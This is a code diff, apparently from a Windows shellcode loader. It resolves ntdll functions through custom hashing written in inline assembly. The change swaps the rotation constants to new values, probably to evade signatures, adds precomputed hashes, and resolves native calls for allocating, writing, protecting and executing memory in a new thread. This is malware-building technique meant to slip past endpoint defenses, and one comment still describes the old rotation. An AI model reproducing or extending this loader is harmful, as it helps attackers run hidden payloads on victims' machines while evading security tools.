@@ -67,7 +67,7 @@ HMODULE CustomGetModuleHandle(unsigned int module_hash) {
             "jl skip_case_adjustment\n\t"
             "sub $0x20, %%al\n\t"             // Convert to uppercase
         "skip_case_adjustment:\n\t"
-            "rol $13, %%r9d\n\t"              // Rotate left by 13 bits
+            "rol $17, %%r9d\n\t"              // Rotate left by 13 bits
             "add %%eax, %%r9d\n\t"            // Add AL to hash
             "loop module_hash_loop\n\t"
         "then:\n\t"
@@ -123,7 +123,7 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
         "function_hash_loop:\n\t"
             "xor %%rax, %%rax\n\t"
             "lodsb\n\t"                       // Load byte into AL
-            "ror $13, %%r9d\n\t"              // Rotate left by 13 bits
+            "ror $23, %%r9d\n\t"              // Rotate right by 23 bits
             "add %%eax, %%r9d\n\t"            // Add AL to hash
             "cmp %%ah, %%al\n\t"
             "jnz function_hash_loop\n\t"
@@ -171,12 +171,20 @@ void main() {
     HANDLE th;
     DWORD old_protect;
 
-    unsigned int ndtll_hash = 0xCCE6C0C4;
-    unsigned int virtual_alloc_hash = 0xD33BCABD; // random hash
+    unsigned int ndtll_hash = 0x69e00346;   // ROL17
+    unsigned int virtual_alloc_hash = 0x96124679; // ROR23
+    unsigned int write_memory_hash = 0x92136911; // ROR23
+    unsigned int virtual_protect_hash = 0xd62f6483; // ROR23
+    unsigned int create_thread_hash = 0xdd007761; // ROR23
+    unsigned int wait_for_single_object_hash = 0xde23aac9; // ROR23
+
     HMODULE hNtdll = CustomGetModuleHandle(ndtll_hash);
 
-    NtAlocVirtMem NtAllocateVirtualMemory = (NtAlocVirtMem)CustomGetProcAdress(hNtdll, virtual_alloc_hash);
-
+    NtAlocVirtMem _NtAlocVirtMem = (NtAlocVirtMem)CustomGetProcAdress(hNtdll, virtual_alloc_hash);
+    NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, write_memory_hash);
+    NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, virtual_protect_hash);
+    NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, create_thread_hash);
+    NtWaitForSingleObject _NtWaitForSingleObject = (NtWaitForSingleObject)CustomGetProcAdress(hNtdll, wait_for_single_object_hash);
 
     
     // Allocating executable memory
